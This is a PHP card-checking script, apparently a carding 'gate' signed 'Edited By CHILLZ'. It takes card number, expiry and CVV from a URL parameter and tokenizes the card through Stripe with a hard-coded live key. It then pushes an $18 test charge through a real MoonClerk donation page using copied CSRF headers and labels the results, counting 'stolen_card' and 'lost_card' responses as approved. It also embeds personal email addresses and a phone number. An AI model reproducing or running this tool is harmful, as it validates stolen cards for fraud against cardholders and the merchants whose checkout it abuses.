<?php

////////////////////////////===[........................]

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr2($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function strposa($haystack, $needles=array(), $offset=0) {
    $chr = array();
    foreach($needles as $needle) {
        $res = strpos($haystack, $needle, $offset);
        if ($res !== false) $chr[$needle] = $res;
    }
    if(empty($chr)) return false;
    return min($chr);
}

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens'); ////This may differ from site to site
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'Accept: application/json',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://checkout.stripe.com',
'Referer: https://checkout.stripe.com/v3/GIQm89WqdPipo5cyACzNQ.html',
'Sec-Fetch-Mode: cors',
'sec-fetch-site: same-site',
 'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]=Jack+cooper&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]=10080&guid=1161117f-a174-4a87-a73d-d780b28930aa11a021&muid=b5195db8-c680-4711-92ab-1da891313132033050&sid=76a4ae12-b4e1-400e-9918-799386a0088b701be4&payment_user_agent=stripe.js%2F7df5c2138%3B+stripe-js-v3%2F7df5c2138&time_on_page=140036&key=pk_live_4VRhmzVJRIlREvyaOF05DbB9&_stripe_account=acct_102opF2fOy8ULYr0&pasted_fields=number');

$resulta = curl_exec($ch);
$resulta1 = json_decode($resulta, true);

$message = trim(strip_tags(getStr2($resulta,'"message": "','"')));
$code = $resulta1['error']['code'];
$dcode = $resulta1['error']['decline_code'];
$token = $resulta1['id'];
$cvc = trim(strip_tags(getStr2($resulta,'"cvc_check": "','"')));
curl_close($ch);

echo $resulta;
echo $token;
///====2nd req========///

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://app.moonclerk.com/pay/7bj96o4wja6i');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host:app.moonclerk.com',   
   'accept: application/json, text/plain, */*',
   'X-Checkout-Signature:815f6NXl2U8WrGjEXuv7HXkIDcvvI8I5Tp1UiHArmK0=',
   'content-type: application/json;charset=UTF-8',
   'X-Requested-With: XMLHttpRequest',
   'X-CSRF-Token:zfo-UG-FDZpLM4pWdULat6tDQC9N89ugfLPSBAYx0w_H3KpphO6nhQ9C3moGQq6rav9FWM1dwjVunckPVRKFkw',
   'Origin:https://app.moonclerk.com',
   'referer: https://app.moonclerk.com/pay/7bj96o4wja6i?embed=true',
   'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36',
   'sec-fetch-mode: cors',
));
 curl_setopt($ch, CURLOPT_POSTFIELDS, '{"checkout":{"amount_due_cents":1800,"coupon_amount_cents":0,"custom_id":null,"email":"dcmarveltg@gmail.com","embedded":true,"fee_applied_cents":1800,"fee_cents":0,"interval":"month","interval_count":1,"name":"Jack cooper","payment_strategy":"card","recurring":false,"starts_at":null,"subtotal_cents":1800,"terms_of_service_id":null,"total_cents":1800,"write_off_cents":0,"extension_responses_attributes":[],"custom_field_responses_attributes":[{"custom_field_id":652858,"kind":"text_field","title":"First Name","response":"Rahul"},{"custom_field_id":652859,"kind":"text_field","title":"Last Name","response":"Instinct"},{"custom_field_id":652860,"kind":"text_field","title":"Address","response":"West Ln 68"},{"custom_field_id":652861,"kind":"text_field","title":"City","response":"New York"},{"custom_field_id":652862,"kind":"select","title":"State/Province","response":"New York"},{"custom_field_id":652863,"kind":"text_field","title":"Zip/Postal Code","response":"10080"},{"custom_field_id":753377,"kind":"select","title":"Country","response":"United States"},{"custom_field_id":652864,"kind":"text_field","title":"Email","response":"rahulkumarprojects@gmail.com"},{"custom_field_id":652865,"kind":"text_field","title":"Tax Receipt Name","response":"Rahul "},{"custom_field_id":652866,"kind":"text_field","title":"Phone","response":"13218884413"}],"stripe_token":"'.$token.'"},"v":3}');

$resultb = curl_exec($ch);
$resultb1 = json_decode($resultb, true);
echo $resultb;

////////////////////////////=====[Bank-Information]

function getbnk($bin)
{
 sleep(rand(1,6));
$bin = substr($bin,0,6);
$url = 'http://bins.su';
//  Initiate curl
$ch = curl_init();
// Disable SSL verification
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
// Will return the response, if false it print the response
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// Set the url
curl_setopt($ch, CURLOPT_URL,$url);
// Execute
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&BIN=&country=');
$result=curl_exec($ch);
// Closing
curl_close($ch);

// Will dump a beauty json :3
//var_dump(json_decode($result, true));

if (preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $matches1))
{
$r1 = $matches1[1][0];
$r2 = $matches1[2][0];
$r3 = $matches1[3][0];
$r4 = $matches1[4][0];
$r5 = $matches1[5][0];
//if(stristr($result,$ip'<tr><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>'))

 return "$bin|$r2 - $r1 - $r3 - $r4 - $r5";

}
else
{
 return "$bin|Unknown.";
}
}




////////////////////////////===[Card Response]

if (strpos(resultb, '"status":"error"')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> <b>- > 🔥 OUTCOME -> [D-Code]: cvc_check: '.$cvc.' </span>  </br>';
} elseif (strpos($resulta, '"cvc_check": "pass"')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> -> <b> 🔥 OUTCOME -> cvc_check: '.$cvc.' </span>  </br>';
}elseif (strpos($resulta, 'zip code you supplied failed validation')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> <b><i>- > [Code]: '.$mess3.' [D-Code]: cvc_check: '.$cvc.' </span>  </br>';
} elseif (strpos($resulta, "Your card's security code is incorrect.")) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[03]</span> ¤ <span class="text-dark">#CCN</span> -> <span class="text-success"> [ CCN MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> <b><i> - > [Code]: '.$code.' [D-Code]: '.$message.' </span> </br>';
} elseif (strpos($resultb, 'Your card has insufficient funds.')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] [ insufficient funds ]</span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> -> <b>🔥 OUTCOME -> [D-Code]: cvc_check: '.$cvc.' </span></br>';
} elseif (strpos($resulta, 'Your card has insufficient funds.')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] [ insufficient funds ]</span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> -> <b>🔥 OUTCOME [D-Code]: cvc_check: '.$cvc.' </span></br>';
} elseif (strpos($resulta, 'lost_card')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ APPROVED CARD! ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> <b><i> - > [D-Code]: '.$dcode.' -> '.$code.' </span></br>';
} elseif (strpos($resulta, 'stolen_card')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ APPROVED CARD! ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> <b><i> - > [D-Code]: '.$dcode.' -> '.$code.'  </span></br>';
} elseif (strpos($resulta, '"cvc_check": "unavailable"')) {
    echo'<b><span class="badge badge-danger"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> <span class="text-dark">[00]</span> -> <span class="text-danger">#Declined </span> <span class="text-danger"> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-danger"> <b><i>- > [Code]: '.$mess2.' [D-Code]: '.$dcode.' -> cvc_check: '.$cvc.' <b><i></span> </br>';
}elseif (strpos($resulta, 'pickup_card')) {
    echo '<b><span class="badge badge-success"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ APPROVED CARD! ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> <b><i> - > [D-Code]: '.$dcode.' -> '.$code.'  </span></br>';
} 
else {
    echo'<b><span class="badge badge-danger"> GATE 1 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> <span class="text-dark">[00]</span> -> <span class="text-danger">#Declined </span> <span class="text-danger"> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-danger"> <b><i>- > [D-Code]: '.$dcode.' -> '.$code.' <b><i></span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response



///////////////////////////////////////////////===========================Edited By CHILLZ ♤ ================================================\\\\\\\\\\\\\\\
?>
